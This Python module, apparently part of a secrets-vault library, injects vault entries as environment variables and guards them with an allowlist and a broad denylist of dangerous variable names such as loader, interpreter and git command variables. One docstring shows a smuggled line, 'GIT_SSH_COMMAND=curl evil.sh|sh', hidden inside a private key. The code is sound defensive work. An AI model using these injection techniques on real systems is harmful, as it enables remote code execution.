"""Environment injection — the dotenv adoption seam.

Vault entries whose service name starts with `env:` are injected as
environment variables at process start:

    # before:  load_dotenv()
    # after:
    import sofiavault.envload
    sofiavault.envload.load("/srv/app/secrets.db", allow=["DATABASE_URL"])

Entry `env:telegram_bot_token` becomes `TELEGRAM_BOT_TOKEN` (service names
are stored lowercase; injected names are uppercased by convention).
Variables already present in the environment are never overwritten unless
`overwrite=True` — explicit deployment overrides win.

Security
--------
A `.env` file and the vault's own contents are untrusted input: a single
vault write must not become code execution in every process the vault
configures. One variable is often enough — `GIT_SSH_COMMAND` is a shell
string, `AWS_CONFIG_FILE` can name a `credential_process` command,
`LESSOPEN` pipes through a command, `HOME` relocates `~/.gitconfig`.

Two gates, in order of preference:

1. **Allowlist (recommended).** Pass `allow=` naming exactly the variables
   your application consumes. Nothing else is injected, whatever the vault
   says. This is the only gate that is complete, because it does not have
   to anticipate the attacker's choice of variable.

2. **Denylist (default).** Without `allow=`, names are checked against
   UNSAFE_NAMES/PREFIXES/SUFFIXES below. That list is broad but cannot be
   exhaustive — every new tool ships new variables. Treat it as a safety
   net for development, not as the control you rely on in production.

`allow_unsafe_names=True` disables gate 2; it has no effect on gate 1,
since an explicit allowlist is already the stronger statement.
"""

import os
import re
import shutil
from collections.abc import Iterable
from pathlib import Path
from typing import Optional, Union

from .vault import Vault, VaultCorrupted

ENV_PREFIX = "env:"

#: A POSIX-portable environment variable name. `\Z` rather than `$`, which
#: also matches before a trailing newline — "PATH\n" would otherwise pass
#: validation and then miss the UNSAFE_NAMES lookup.
VALID_NAME = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*\Z')

#: Names that let an attacker execute code in, redirect, or downgrade the
#: transport security of the child process. Exact matches; see also
#: UNSAFE_PREFIXES and UNSAFE_SUFFIXES.
#:
#: Families where every member is dangerous are covered by prefix instead.
#: Families that also hold the secrets people legitimately inject (AWS_,
#: PG, GIT_) are enumerated by hand, so AWS_SECRET_ACCESS_KEY and
#: PGPASSWORD still work.
UNSAFE_NAMES = frozenset({
    # shell
    'BASH_ENV', 'ENV', 'CDPATH', 'IFS', 'PS4', 'SHELLOPTS', 'BASHOPTS',
    'GLOBIGNORE', 'PROMPT_COMMAND', 'BASH_FUNC', 'ZDOTDIR', 'FPATH',
    'MAIL', 'MAILPATH',
    # dynamic loader
    'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT', 'LD_CONFIG', 'LD_ORIGIN_PATH',
    'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH', 'DYLD_FRAMEWORK_PATH',
    'GCONV_PATH', 'LOCPATH', 'NLSPATH', 'RESOLV_HOST_CONF', 'HOSTALIASES',
    'TERMINFO', 'TERMINFO_DIRS', 'TERMPATH', 'TERMCAP',
    # interpreters and language runtimes
    'PYTHONPATH', 'PYTHONSTARTUP', 'PYTHONHOME', 'PYTHONEXECUTABLE',
    'PYTHONWARNINGS', 'PYTHONINSPECT', 'PYTHONBREAKPOINT',
    'NODE_OPTIONS', 'NODE_PATH', 'NODE_REPL_EXTERNAL_MODULE',
    'NODE_EXTRA_CA_CERTS', 'NODE_TLS_REJECT_UNAUTHORIZED',
    'PERL5OPT', 'PERL5LIB', 'PERLLIB', 'PERL5DB',
    'RUBYOPT', 'RUBYLIB', 'RUBYGEMS_GEMDEPS', 'BUNDLE_GEMFILE',
    'GEM_HOME', 'GEM_PATH',
    'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'JDK_JAVA_OPTIONS', 'JAVA_OPTS',
    'JAVACMD', 'JAVA_HOME', 'MAVEN_OPTS', 'GRADLE_OPTS', 'SBT_OPTS',
    'CLASSPATH',
    'R_HOME', 'R_PROFILE', 'R_PROFILE_USER', 'R_LIBS', 'R_LIBS_USER',
    'R_ENVIRON', 'LUA_PATH', 'LUA_CPATH', 'LUA_INIT',
    'GOFLAGS', 'GOPRIVATE', 'GOPROXY',
    'CARGO_HOME', 'RUSTUP_HOME', 'RUSTFLAGS',
    'COMPOSER_HOME', 'PHP_INI_SCAN_DIR', 'PHPRC',
    # process resolution
    'PATH', 'SHELL', 'PAGER', 'EDITOR', 'VISUAL', 'MANPAGER', 'BROWSER',
    'COMSPEC', 'PATHEXT', 'PSMODULEPATH', 'SYSTEMROOT', 'WINDIR',
    # home / config redirection — owns ~/.gitconfig, ~/.ssh/config, ~/.netrc
    'HOME', 'USERPROFILE', 'APPDATA', 'LOCALAPPDATA', 'ALLUSERSPROFILE',
    'TMPDIR', 'TMP', 'TEMP', 'GNUPGHOME', 'NETRC',
    # TLS trust / verification
    'SSL_CERT_FILE', 'SSL_CERT_DIR', 'SSLKEYLOGFILE', 'REQUESTS_CA_BUNDLE',
    'CURL_CA_BUNDLE', 'CURL_HOME', 'PYTHONHTTPSVERIFY',
    # git — command strings and config takeover
    'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_EXTERNAL_DIFF', 'GIT_DIFF_OPTS',
    'GIT_PAGER', 'GIT_EDITOR', 'GIT_SEQUENCE_EDITOR', 'GIT_ASKPASS',
    'GIT_PROXY_COMMAND', 'GIT_TEMPLATE_DIR', 'GIT_EXEC_PATH',
    'GIT_HOOKS_PATH', 'GIT_DIR', 'GIT_WORK_TREE', 'GIT_NAMESPACE',
    'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_CEILING_DIRECTORIES',
    'GIT_ALTERNATE_OBJECT_DIRECTORIES', 'GIT_ATTR_NOSYSTEM',
    'GIT_SSL_CAINFO', 'GIT_SSL_CAPATH', 'GIT_SSL_NO_VERIFY',
    # other VCS / transfer tools that take a remote-shell command
    'RSYNC_RSH', 'CVS_RSH', 'CVSROOT', 'HGRCPATH', 'HGPLAIN', 'HGUSER',
    'BZR_EDITOR', 'SVN_EDITOR', 'SVN_SSH',
    # pagers and helper hooks
    'MORE', 'GROFF_TMAC_PATH', 'MANPATH', 'MANROFFSEQ',
    # ssh / sudo credential helpers
    'SSH_ASKPASS_REQUIRE', 'SSH_AUTH_SOCK', 'SSH_AGENT_PID', 'SUDO_EDITOR',
    # cloud / orchestration credential plugins (exec arbitrary commands)
    'AWS_CONFIG_FILE', 'AWS_SHARED_CREDENTIALS_FILE', 'AWS_PROFILE',
    'AWS_DEFAULT_PROFILE', 'AWS_ENDPOINT_URL',
    'AWS_EC2_METADATA_SERVICE_ENDPOINT', 'AWS_CONTAINER_CREDENTIALS_FULL_URI',
    'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', 'AWS_WEB_IDENTITY_TOKEN_FILE',
    'AWS_ROLE_ARN', 'AWS_USE_FIPS_ENDPOINT',
    'KUBECONFIG', 'DOCKER_HOST', 'DOCKER_CONFIG', 'DOCKER_CERT_PATH',
    'DOCKER_TLS_VERIFY', 'CLOUDSDK_CONFIG', 'CLOUDSDK_PYTHON',
    'GOOGLE_APPLICATION_CREDENTIALS', 'AZURE_CONFIG_DIR',
    # package managers — an attacker registry means attacker postinstall code
    'YARN_REGISTRY', 'YARN_RC_FILENAME',
    # postgres / db config files (PGPASSWORD, PGUSER, ... stay injectable)
    'PGSERVICEFILE', 'PGPASSFILE', 'PGSYSCONFDIR', 'PGSERVICE',
    'PGSSLMODE', 'PGSSLROOTCERT', 'PGSSLCERT', 'PGSSLKEY', 'PGREQUIRESSL',
    'MYSQL_HOME', 'MYSQL_TEST_LOGIN_FILE', 'ODBCINI', 'ODBCSYSINI',
    # profilers / runtime instrumentation that dlopen a path
    'GST_PLUGIN_PATH', 'ASAN_OPTIONS', 'UBSAN_OPTIONS', 'TSAN_OPTIONS',
    # our own bootstrap credentials
    'SOFIAVAULT_KEY', 'SOFIAVAULT_PASSWORD', 'SOFIAVAULT_KEY_FILE',
})

#: Prefix families where every member is dangerous.
UNSAFE_PREFIXES = (
    'LD_', 'DYLD_', 'BASH_FUNC_', 'PYTHON', 'SOFIAVAULT_',
    'GIT_CONFIG', 'GIT_TRACE', 'LC_',
    'DOTNET_', 'CORECLR_', 'COR_', 'XDG_', 'NPM_CONFIG_', 'PIP_',
    'OPENSSL_', 'LESS', 'MALLOC', 'GTK_', 'QT_', 'GIO_', 'SSH_ASKPASS',
    'SUDO_ASK',
)

#: Suffix families. `*_PROXY` covers HTTPS_PROXY/HTTP_PROXY/ALL_PROXY and
#: every tool-specific variant; the CA/askpass/remote-shell suffixes cover
#: the same pattern for tools not enumerated above.
UNSAFE_SUFFIXES = (
    '_PROXY', '_CA_BUNDLE', '_CACERT', '_CA_CERT', '_CERT_FILE', '_CERT_DIR',
    '_ASKPASS', '_RSH', '_CONFIG_FILE', '_STARTUP_HOOKS',
)

#: Bootstrap credentials that must never be inherited by an exec'd child.
BOOTSTRAP_VARS = ('SOFIAVAULT_KEY', 'SOFIAVAULT_PASSWORD', 'SOFIAVAULT_KEY_FILE')


class UnsafeVariableName(ValueError):
    """A variable name is malformed or is a loader/interpreter variable."""


class MalformedEnvFile(ValueError):
    """A .env file could not be parsed unambiguously.

    Raised rather than guessed at: an unterminated quote makes every line
    after it ambiguous — either value text or a new variable — and picking
    one silently is how a pasted key block smuggles in a variable.
    """


def is_safe_name(name: str) -> bool:
    """True if `name` is well-formed and not on the denylist.

    A False here is reliable; a True is not a guarantee of safety — see the
    module docstring on why a denylist cannot be completed.
    """
    if not isinstance(name, str) or not VALID_NAME.match(name):
        return False
    upper = name.upper()
    if upper in UNSAFE_NAMES:
        return False
    if any(upper.startswith(p) for p in UNSAFE_PREFIXES):
        return False
    return not any(upper.endswith(s) for s in UNSAFE_SUFFIXES)


def _normalize_allow(allow: Optional[Iterable[str]]) -> Optional[set]:
    """Validate and upper-case an allowlist. None means denylist mode."""
    if allow is None:
        return None
    names = set()
    for raw in allow:
        if not isinstance(raw, str) or not VALID_NAME.match(raw):
            raise UnsafeVariableName(f"allowlist entry is not a valid name: {raw!r}")
        names.add(raw.upper())
    return names


def _check_name(name: str, allowed: Optional[set], allow_unsafe_names: bool) -> bool:
    """Apply whichever gate is in force to one name being stored/injected."""
    if allowed is not None:
        return name.upper() in allowed
    return allow_unsafe_names or is_safe_name(name)


def _entry_names(vault: Vault) -> list[tuple[str, str]]:
    """(service, ENVNAME) pairs for every env:* entry."""
    out = []
    for meta in vault.list_entries():
        if not meta.service.startswith(ENV_PREFIX):
            continue
        name = meta.service[len(ENV_PREFIX):]
        if name:
            out.append((meta.service, name.upper()))
    return out


def load(path: Union[str, Path, None] = None, *, vault: Optional[Vault] = None,
         allow: Optional[Iterable[str]] = None,
         overwrite: bool = False, environ: Optional[dict] = None,
         allow_unsafe_names: bool = False,
         allow_corrupt: bool = False) -> tuple[list[str], list[str]]:
    """Inject all `env:*` entries into the environment.

    Provide either an already-open `vault=` or a `path` (unlocked via
    Vault.open_auto — raises VaultLocked if no key source is configured).

    `allow` names the variables this application consumes; anything else in
    the vault is refused. Strongly preferred over the default denylist —
    see the module docstring.

    Returns `(injected, skipped)`: names that were set, and names that were
    left alone because the environment already defined them. Callers that
    care about ambient overrides can log or reject on a non-empty `skipped`.

    Raises UnsafeVariableName for malformed, denied, or non-allowlisted
    names, and VaultCorrupted if the vault failed authenticated decryption
    or its entry set does not match its MAC. Validation happens up front,
    so injection is all-or-nothing.
    """
    env = environ if environ is not None else os.environ
    allowed = _normalize_allow(allow)
    own = False
    v = vault
    if v is None:
        if path is None:
            raise ValueError("provide path or vault=")
        v = Vault.open_auto(path)
        own = True

    try:
        if v.corrupt_count and not allow_corrupt:
            raise VaultCorrupted(
                f"{v.corrupt_count} vault entries failed authenticated "
                "decryption; refusing to inject a partial environment "
                "(pass allow_corrupt=True to override)"
            )
        # corrupt_count only counts entries that failed to decrypt. Deleting
        # or rolling back a row leaves every remaining blob decryptable, so
        # it shows up in `tampered` alone. Relying on Vault.get() to catch it
        # is not enough: an env:* row that was deleted, or one whose name is
        # already set in the environment, never reaches a get() call.
        if v.tampered and not allow_corrupt:
            raise VaultCorrupted(
                "the vault's entry set does not match its authentication tag; "
                "refusing to inject an environment from it "
                "(pass allow_corrupt=True to override)"
            )

        pairs = _entry_names(v)

        if allowed is not None:
            # Names outside the allowlist are simply not injected, so a vault
            # shared by several services stays usable. A *dangerous* one still
            # raises: an application that finds GIT_SSH_COMMAND sitting in its
            # vault is being attacked, and silently ignoring it hides that.
            ignored = [name for _s, name in pairs if name.upper() not in allowed]
            bad = sorted({name for name in ignored if not is_safe_name(name)})
            if bad and not allow_unsafe_names:
                raise UnsafeVariableName(
                    "vault contains unsafe variable name(s) outside the "
                    "allowlist: " + ", ".join(bad)
                )
            pairs = [(s, name) for s, name in pairs if name.upper() in allowed]
        else:
            bad = sorted({name for _s, name in pairs
                          if not (allow_unsafe_names or is_safe_name(name))})
            if bad:
                raise UnsafeVariableName(
                    "refusing to inject unsafe variable name(s): " + ", ".join(bad)
                )

        # Resolve every value before mutating the environment, so a failure
        # part-way cannot leave the process half-configured.
        pending = []
        skipped = []
        for service, name in pairs:
            if not overwrite and name in env:
                skipped.append(name)
                continue
            value = v.get(service)
            # os.environ rejects an embedded NUL, and it would raise from the
            # mutation loop below — after earlier names were already set. The
            # entries are processed in sorted order, so a single poisoned
            # value would let an attacker choose exactly which variables get
            # applied and which are dropped.
            if not isinstance(value, str) or "\0" in value:
                raise UnsafeVariableName(
                    f"refusing to inject {name}: value is not a NUL-free string"
                )
            pending.append((name, value))

        injected = []
        for name, value in pending:
            env[name] = value
            injected.append(name)
    finally:
        if own:
            v.close()
    return sorted(injected), sorted(skipped)


def _iter_env_pairs(text: str):
    """Yield (name, value) for each dotenv entry; value is None if malformed.

    A quoted value that does not close on its own line is consumed across
    the following lines until the quote closes. Parsing each of those lines
    on its own instead is a name-smuggling primitive: in

        JWT_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----
        GIT_SSH_COMMAND=curl evil.sh|sh
        -----END PRIVATE KEY-----"

    the middle line reads as key material to a reviewer, but becomes its
    own injected variable.
    """
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        i += 1
        if not line or line.startswith('#') or '=' not in line:
            continue
        name, _, value = line.partition('=')
        name = name.strip()
        if name[:7] in ('export ', 'export\t'):
            name = name[len('export'):].strip()
        if not name:
            continue

        value = value.strip()
        if value[:1] in ('"', "'"):
            quote = value[0]
            if len(value) >= 2 and value[-1] == quote:
                yield name, value[1:-1]
                continue
            parts = [value[1:]]
            closed = False
            while i < len(lines):
                nxt = lines[i]
                i += 1
                if nxt.rstrip().endswith(quote):
                    parts.append(nxt.rstrip()[:-1])
                    closed = True
                    break
                parts.append(nxt)
            yield name, ("\n".join(parts) if closed else None)
            continue

        # dotenv strips an unquoted trailing comment introduced by whitespace
        for sep in (' #', '\t#'):
            if sep in value:
                value = value.split(sep, 1)[0].strip()
        yield name, value


def import_env_file(vault: Vault, env_path: Union[str, Path],
                    overwrite: bool = False,
                    allow: Optional[Iterable[str]] = None,
                    allow_unsafe_names: bool = False,
                    ) -> tuple[list[str], list[str], list[str]]:
    """Bulk-import NAME=value lines from a dotenv-style file as env:* entries.

    Returns (imported, skipped, rejected):
      - imported: names stored in the vault
      - skipped:  already present (and overwrite=False), or empty value
      - rejected: malformed, denied, non-allowlisted, unterminated-quote, or
                  case-colliding names — never written to the vault

    Comment and blank lines are ignored; surrounding single/double quotes on
    values are stripped, matching dotenv behavior.
    """
    imported = []
    skipped = []
    rejected = []
    allowed = _normalize_allow(allow)
    text = Path(env_path).read_text(encoding="utf-8-sig")
    existing = {e.service for e in vault.list_entries()}
    seen_in_file = set()

    # Parse the whole file before writing anything, so a malformed line
    # cannot leave half its variables in the vault.
    pairs = list(_iter_env_pairs(text))
    for name, value in pairs:
        if value is None:
            raise MalformedEnvFile(
                f"{env_path}: the value of {name} opens a quote that is never "
                "closed, so everything after it is ambiguous. Nothing was "
                "imported — fix the quoting and re-run."
            )

    for name, value in pairs:
        if not VALID_NAME.match(name) or not _check_name(
                name, allowed, allow_unsafe_names):
            rejected.append(name)
            continue
        # `TOKEN` and `token` collapse onto one service, so whichever line
        # came second would silently win or lose depending on `overwrite`.
        # Refuse both rather than pick one.
        if name.upper() in seen_in_file:
            rejected.append(name)
            continue
        seen_in_file.add(name.upper())

        if not value:
            skipped.append(name)
            continue

        service = ENV_PREFIX + name.lower()
        if service in existing and not overwrite:
            skipped.append(name)
            continue
        vault.set(service, value, username="env")
        existing.add(service)
        imported.append(name)

    return imported, skipped, rejected


def list_env_entries(vault: Vault) -> list[str]:
    """Names of the environment variables the vault would inject."""
    return sorted(name for _service, name in _entry_names(vault))


def exec_with_env(vault: Vault, argv: list[str], *,
                  allow: Optional[Iterable[str]] = None,
                  allow_unsafe_names: bool = False) -> "None":
    """Inject env:* entries, close the vault, then exec the command.

    Replaces the current process (never returns on success) — secrets go
    straight into the child's environment without touching disk.

    The SOFIAVAULT_* bootstrap credentials are removed from the environment
    before exec: the child gets the secrets it was scoped to receive, not
    the key to the whole vault.
    """
    if not argv:
        raise ValueError("no command given")

    # Resolve the program against the PATH we were started with. execvp()
    # searches the *post-injection* PATH, so with allow_unsafe_names=True
    # and no ambient PATH a vault entry could pick which binary runs.
    program = argv[0]
    resolved = program if os.path.sep in program else shutil.which(program)
    if resolved is None:
        raise FileNotFoundError(f"command not found on PATH: {program}")

    try:
        load(vault=vault, environ=os.environ, allow=allow,
             allow_unsafe_names=allow_unsafe_names)
    finally:
        # A validation failure must still drop the key rather than leave the
        # caller holding an unlocked vault.
        vault.close()
    for var in BOOTSTRAP_VARS:
        os.environ.pop(var, None)
    os.execv(resolved, argv)
